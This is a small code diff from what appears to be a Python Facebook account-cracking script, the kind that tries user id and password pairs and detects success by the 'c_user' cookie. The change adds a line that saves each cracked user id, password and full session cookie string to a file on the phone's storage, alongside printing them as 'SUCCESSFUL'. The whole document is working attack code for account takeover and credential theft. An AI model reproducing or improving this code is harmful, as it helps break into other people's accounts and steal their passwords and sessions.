@@ -159,9 +159,9 @@ def host(uid, pwx, meth, fb):
             if "c_user" in heron_brand:
                 coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                 xx = coki.split("c_user=")[1]
-                xd = xx[:15]
+                xd = xx[:15].replace(";", "  ")
                 print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
-
+                open("/sdcard/shadid.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
                 break
             elif "checkpoint" in heron_brand:
                 print(f"\r\r[UNSUCCESSFUL] {xd} <> {ps}\n")
